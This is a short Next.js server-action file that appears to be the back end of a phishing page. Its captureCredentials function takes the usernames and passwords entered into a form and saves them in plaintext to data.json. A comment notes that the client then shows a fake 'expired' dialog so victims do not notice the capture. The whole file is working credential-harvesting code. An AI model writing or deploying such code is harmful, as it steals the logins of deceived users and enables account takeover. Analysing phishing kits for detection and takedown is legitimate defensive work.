'use server';

import * as fs from 'fs/promises';
import * as path from 'path';

const DATA_FILE = path.join(process.cwd(), 'data.json');

// Helper function to read data from the JSON file
async function readData() {
  try {
    await fs.access(DATA_FILE);
    const fileContent = await fs.readFile(DATA_FILE, 'utf-8');
    return JSON.parse(fileContent);
  } catch (error) {
    // If the file doesn't exist or is empty, return an empty array
    return [];
  }
}

// Helper function to write data to the JSON file
async function writeData(data: any) {
  await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
}

// Server action to capture credentials
export async function captureCredentials(prevState: any, formData: FormData) {
  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  console.log('Capturing credentials for:', username);

  if (!username || !password) {
    console.log('Submission failed: Missing username or password.');
    return { success: false, message: 'Username and password are required.' };
  }

  try {
    const existingData = await readData();
    const newCredential = {
      username,
      password,
      createdAt: new Date().toISOString(),
    };

    existingData.push(newCredential);
    await writeData(existingData);

    console.log('Successfully saved credentials to data.json.');
    // This is the state we return on success. The client will show the "expired" dialog.
    return { success: true, message: 'Submission successful.' };

  } catch (error: any) {
    console.error('Error in captureCredentials:', error.message);
    // Return a specific error message for the client
    return {
      success: false,
      message: error.message || 'Failed to save credentials. Please check server logs.',
    };
  }
}
